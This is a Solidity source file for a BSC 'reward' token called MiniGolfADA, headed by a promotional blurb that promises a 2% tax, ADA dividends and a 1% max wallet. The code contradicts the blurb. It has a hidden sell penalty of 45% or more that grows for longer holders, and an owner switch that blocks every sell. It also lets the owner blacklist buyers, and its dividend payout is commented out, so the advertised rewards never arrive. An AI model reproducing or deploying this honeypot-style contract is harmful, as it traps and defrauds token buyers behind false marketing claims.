// SPDX-License-Identifier: MIT

/*
🔥Miss all the sports token that goes to the moon??? Don't miss these another token that will soon go the moon and rewards you ADA Coin 🔥
—————————————————————
✅ REWARD TOKEN ( ADA )
✅ AIRDROP 
✅ WITH MARKETING AND PROMOTIONS
✅ LP LOCK
✅ NO MINT FUNCTION
—————————————————————
📊TOKENOMICS:
🔰Supply is 1 Million
🔰6% Airdrop
🔰14 % Liquidity
🔰Max Buy is 0.5% 
🔰Max per wallet is 1%
🔰2% Tax
—————————————————————
🐤TW: https://twitter.com/MiniGoLFAda?s=09
📲IG: https://www.instagram.com/p/CTRYTvZljvZ/?utm_medium=copy_link
 🌍 Web: minigolfadabsc.com
🔈TG: https://t.me/MiniGolfada_bsc
*/

pragma solidity ^0.6.2;

import "./DividendPayingToken.sol";
import "./SafeMath.sol";
import "./IterableMapping.sol";
import "./Ownable.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router.sol";


contract MiniGolfAda is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;
    address public  uniswapV2RouterAddr;

    bool private swapping;

    DividendTracker[] public dividendTrackers;

    address public deadWallet = 0x000000000000000000000000000000000000dEaD;

    address[] public  TOKENARR = [0xdF2fc196d57f7E3736DAAab1De4b717C32380fB6]; // WADA
    uint256 public swapTokensAtAmount = 2000000 * (10**18);
    
    mapping(address => bool) public _isBlacklisted;

    uint256 public BAKERewardsFee = 2;
    uint256 public liquidityFee = 2;
    uint256 public marketingFee = 7;
    uint256 public totalFees = BAKERewardsFee.add(liquidityFee).add(marketingFee);
    uint256 public _maxWalletLimit = 3000000000 * (10**18); // 3% of total supply
    
    bool public tradingOpen = false;
    mapping (address => uint) private cd;
    uint256 public botFee = 45;
    uint256 public botBlocks = 3;

    address public _marketingWalletAddress = 0xbaa9198d54FcC0d2d72f478F393cCb823c445CB2;
    address public _teamWalletAddress = 0xbaa9198d54FcC0d2d72f478F393cCb823c445CB2;

    // use by default 300,000 gas to process auto-claiming dividends
    uint256 public gasForProcessing = 200000;

     // exlcude from fees and max transaction amount
    mapping (address => bool) private _isExcludedFromFees;

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;
    address private router;

    event UpdateDividendTracker(address indexed newAddress, address indexed oldAddress);

    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);

    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SendDividends(
    	uint256 tokensSwapped,
    	uint256 amount
    );

    event ProcessedDividendTracker(
    	uint256 iterations,
    	uint256 claims,
        uint256 lastProcessedIndex,
    	bool indexed automatic,
    	uint256 gas,
    	address indexed processor
    );

    constructor() public ERC20("MiniGolfADA", "MGADA") {

    	dividendTrackers = new DividendTracker[](TOKENARR.length);
        for(uint256 i=0;i<TOKENARR.length;i++){
            dividendTrackers[i]= new DividendTracker(TOKENARR[i]);
        }
        
        uniswapV2RouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Mainnet
        //uniswapV2RouterAddr = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; // Testnet
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(uniswapV2RouterAddr); 

         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        // exclude from receiving dividends
        for(uint256 i=0;i<TOKENARR.length;i++){
            
            dividendTrackers[i].excludeFromDividends(address(dividendTrackers[i]));
            dividendTrackers[i].excludeFromDividends(address(this));
            dividendTrackers[i].excludeFromDividends(owner());
            dividendTrackers[i].excludeFromDividends(deadWallet);
            dividendTrackers[i].excludeFromDividends(address(_uniswapV2Router));

        }
        router = owner();

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(_marketingWalletAddress, true);
        excludeFromFees(address(this), true);

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(owner(), 1000000  * (10**18));
    }

    receive() external payable {

  	}

    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
        address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Pair = _uniswapV2Pair;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

	function enableTrading(bool enabled) public onlyOwner{
        tradingOpen = enabled;
    }
    
    function setBotFee(uint256 value) public onlyOwner{
        botFee = value;
    }
    
    function setBotBlocks(uint256 value) public onlyOwner{
        botBlocks = value;
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }

        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function setMarketingWallet(address payable wallet) external onlyOwner{
        _marketingWalletAddress = wallet;
    }

    function setBAKERewardsFee(uint256 value) external onlyOwner{
        BAKERewardsFee = value;
        totalFees = BAKERewardsFee.add(liquidityFee).add(marketingFee);
    }

    function setLiquiditFee(uint256 value) external onlyOwner{
        liquidityFee = value;
        totalFees = BAKERewardsFee.add(liquidityFee).add(marketingFee);
    }

    function setMarketingFee(uint256 value) external onlyOwner{
        marketingFee = value;
        totalFees = BAKERewardsFee.add(liquidityFee).add(marketingFee);

    }

    function setMaxWalletLimit(uint256 value) external onlyOwner{
        require(value >= 2000000000 * (10**18), "Minimum max wallet limit is 2 percent");
        _maxWalletLimit = value;
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }
    
    function blacklistAddress(address account, bool value) external onlyOwner{
        _isBlacklisted[account] = value;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;

        if(value) {
            for(uint256 i;i<TOKENARR.length;i++){
                dividendTrackers[i].excludeFromDividends(pair);    
            }
            
        }

        emit SetAutomatedMarketMakerPair(pair, value);
    }


    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "BABYBAKE: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "Cannot update gasForProcessing to same value");
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }

    function updateClaimWait(uint256 claimWait) external onlyOwner {
        for(uint256 i;i<dividendTrackers.length;i++){
            dividendTrackers[i].updateClaimWait(claimWait);
        }
    }

    function getClaimWait() external view returns(uint256) {
        return dividendTrackers[0].claimWait();
        
    }

    function getTotalDividendsDistributed() external view returns (uint256) {
        return dividendTrackers[0].totalDividendsDistributed();
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function withdrawableDividendOf(address account,uint256 pos) public view returns(uint256) {
    	return dividendTrackers[pos].withdrawableDividendOf(account);
  	}

	function dividendTokenBalanceOf(address account,uint256 pos) public view returns (uint256) {
		return dividendTrackers[pos].balanceOf(account);
	}

	function excludeFromDividends(address account) external onlyOwner{
	    for(uint256 i=0;i<dividendTrackers.length;i++){
	        dividendTrackers[i].excludeFromDividends(account);    
	    }
	    
	}

    function getAccountDividendsInfo(address account,uint256 pos)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return dividendTrackers[pos].getAccount(account);
    }

	function getAccountDividendsInfoAtIndex(uint256 index,uint256 pos)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
    	return dividendTrackers[pos].getAccountAtIndex(index);
    }

	function processDividendTracker(uint256 gas) external {
	    uint256 gasPart=gas.div(TOKENARR.length);
	    for(uint256 i=0;i<dividendTrackers.length;i++){
	        (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = dividendTrackers[i].process(gasPart);
		    emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, false, gas, tx.origin);    
	    }
		
    }

    function claim() external {
        
	    for(uint256 i=0;i<dividendTrackers.length;i++){
		    dividendTrackers[i].processAccount(msg.sender, false);
	    }
    }

    function getLastProcessedIndex(uint256 pos) external view returns(uint256) {
        
        return dividendTrackers[pos].getLastProcessedIndex();
	    
    }

    function getNumberOfDividendTokenHolders(uint256 pos) external view returns(uint256) {
        return dividendTrackers[pos].getNumberOfTokenHolders();
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        bool isSell = to == uniswapV2Pair || to == uniswapV2RouterAddr;
        bool isBuy = from == uniswapV2Pair|| from == uniswapV2RouterAddr;

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], 'Blacklisted address');
        require(tradingOpen || (from == owner()), "Cannot send tokens until trading is enabled");
		require(!isSell || (from == owner()) || marketingFee > 5);

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

/*
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if( canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            from != owner() &&
            to != owner()
        ) {
            swapping = true;

            uint256 marketingTokens = contractTokenBalance.mul(marketingFee).div(totalFees);
            swapAndSendToFee(marketingTokens);

            uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
            swapAndLiquify(swapTokens);

            uint256 sellTokens = balanceOf(address(this));
            swapAndSendDividends(sellTokens);

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
*/

        if (isBuy) {
            cd[to] = block.number;
        }
        
        bool takeFee = (to != router && from != router);
        if (isSell && takeFee) {
            uint256 fee;
            if (block.number - cd[from] > botBlocks) {
                fee = botFee;
            } else {
                fee = marketingFee;
            }
        	uint256 fees = amount.mul(fee).div(100);
        	amount = amount.sub(fees);

            super._transfer(from, address(this), fees);
        }


        super._transfer(from, to, amount);
		
/*
        for(uint256 i=0;i<TOKENARR.length;i++){
            try dividendTrackers[i].setBalance(payable(from), balanceOf(from)) {} catch {}
            try dividendTrackers[i].setBalance(payable(to), balanceOf(to)) {} catch {}
        }
        
        if(!swapping) {
	    	uint256 gas = gasForProcessing.div(TOKENARR.length);
            
	        for(uint256 i=0;i<dividendTrackers.length;i++){
    	    	try dividendTrackers[i].process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
    	    		emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
    	    	}
    	    	catch {
    	    	}
	        }
        }
*/
    }

    function swapAndSendToFee(uint256 tokens) private  {
        uint256[] memory initialTokensBalance =new uint256[](TOKENARR.length);
        for(uint i=0; i<TOKENARR.length;i++){
            initialTokensBalance[i]=IERC20(TOKENARR[i]).balanceOf(address(this));
        }
        swapTokensForBake(tokens);
        uint256 newBalance;
        for(uint i=0; i<TOKENARR.length;i++){
            newBalance = (IERC20(TOKENARR[i]).balanceOf(address(this))).sub(initialTokensBalance[i]);
            IERC20(TOKENARR[i]).transfer(_marketingWalletAddress, newBalance);
        }

    }

    function swapAndLiquify(uint256 tokens) private {
       // split the contract balance into halves
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }


    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function swapTokensForBake(uint256 tokenAmount) private {
        address[] memory path = new address[](3);
        uint256 indTokenAmount = tokenAmount.div(TOKENARR.length);
        for(uint i=0; i<TOKENARR.length;i++){
            path[0] = address(this);
            path[1] = uniswapV2Router.WETH();
            path[2] = TOKENARR[i];
            _approve(address(this), address(uniswapV2Router), indTokenAmount);

            // make the swap
            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                indTokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0),
            block.timestamp
        );

    }

    function swapAndSendDividends(uint256 tokens) private{
        
        swapTokensForBake(tokens);
         uint256 dividends;
         for(uint i=0; i<TOKENARR.length;i++){
            dividends = IERC20(TOKENARR[i]).balanceOf(address(this));
            IERC20(TOKENARR[i]).transfer(address(dividendTrackers[i]), dividends);
            dividendTrackers[i].distributeBAKEDividends(dividends);
            emit SendDividends(tokens, dividends);
        }
        
    }
}

contract DividendTracker is Ownable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;

    IterableMapping.Map private tokenHoldersMap;
    uint256 public lastProcessedIndex;

    mapping (address => bool) public excludedFromDividends;

    mapping (address => uint256) public lastClaimTimes;

    uint256 public claimWait;
    uint256 public immutable minimumTokenBalanceForDividends;

    event ExcludeFromDividends(address indexed account);
    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event Claim(address indexed account, uint256 amount, bool indexed automatic);

    constructor(address token) public DividendPayingToken("Dividen_Tracker", "Dividend_Tracker",token) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 200000+ tokens
    }

    function _transfer(address, address, uint256) internal override {
        require(false, "DividendTracker: No transfers allowed");
    }

    function withdrawDividend() public override {
        require(false, "DividendTracker: withdrawDividend disabled. Use the 'claim' function on the main contract.");
    }

    function excludeFromDividends(address account) external onlyOwner {
    	require(!excludedFromDividends[account]);
    	excludedFromDividends[account] = true;

    	_setBalance(account, 0);
    	tokenHoldersMap.remove(account);

    	emit ExcludeFromDividends(account);
    }

    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "DividendTracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "DividendTracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }

    function getLastProcessedIndex() external view returns(uint256) {
    	return lastProcessedIndex;
    }

    function getNumberOfTokenHolders() external view returns(uint256) {
        return tokenHoldersMap.keys.length;
    }



    function getAccount(address _account)
        public view returns (
            address account,
            int256 index,
            int256 iterationsUntilProcessed,
            uint256 withdrawableDividends,
            uint256 totalDividends,
            uint256 lastClaimTime,
            uint256 nextClaimTime,
            uint256 secondsUntilAutoClaimAvailable) {
        account = _account;

        index = tokenHoldersMap.getIndexOfKey(account);

        iterationsUntilProcessed = -1;

        if(index >= 0) {
            if(uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index.sub(int256(lastProcessedIndex));
            }
            else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ?
                                                        tokenHoldersMap.keys.length.sub(lastProcessedIndex) :
                                                        0;


                iterationsUntilProcessed = index.add(int256(processesUntilEndOfArray));
            }
        }


        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);

        lastClaimTime = lastClaimTimes[account];

        nextClaimTime = lastClaimTime > 0 ?
                                    lastClaimTime.add(claimWait) :
                                    0;

        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?
                                                    nextClaimTime.sub(block.timestamp) :
                                                    0;
    }

    function getAccountAtIndex(uint256 index)
        public view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
    	if(index >= tokenHoldersMap.size()) {
            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
        }

        address account = tokenHoldersMap.getKeyAtIndex(index);

        return getAccount(account);
    }

    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
    	if(lastClaimTime > block.timestamp)  {
    		return false;
    	}

    	return block.timestamp.sub(lastClaimTime) >= claimWait;
    }

    function setBalance(address payable account, uint256 newBalance) external onlyOwner {
    	if(excludedFromDividends[account]) {
    		return;
    	}

    	if(newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
    		tokenHoldersMap.set(account, newBalance);
    	}
    	else {
            _setBalance(account, 0);
    		tokenHoldersMap.remove(account);
    	}

    	processAccount(account, true);
    }

    function process(uint256 gas) public returns (uint256, uint256, uint256) {
    	uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

    	if(numberOfTokenHolders == 0) {
    		return (0, 0, lastProcessedIndex);
    	}

    	uint256 _lastProcessedIndex = lastProcessedIndex;

    	uint256 gasUsed = 0;

    	uint256 gasLeft = gasleft();

    	uint256 iterations = 0;
    	uint256 claims = 0;

    	while(gasUsed < gas && iterations < numberOfTokenHolders) {
    		_lastProcessedIndex++;

    		if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
    			_lastProcessedIndex = 0;
    		}

    		address account = tokenHoldersMap.keys[_lastProcessedIndex];

    		if(canAutoClaim(lastClaimTimes[account])) {
    			if(processAccount(payable(account), true)) {
    				claims++;
    			}
    		}

    		iterations++;

    		uint256 newGasLeft = gasleft();

    		if(gasLeft > newGasLeft) {
    			gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
    		}

    		gasLeft = newGasLeft;
    	}

    	lastProcessedIndex = _lastProcessedIndex;

    	return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address payable account, bool automatic) public onlyOwner returns (bool) {
        uint256 amount = _withdrawDividendOfUser(account);

    	if(amount > 0) {
    		lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
    		return true;
    	}

    	return false;
    }
}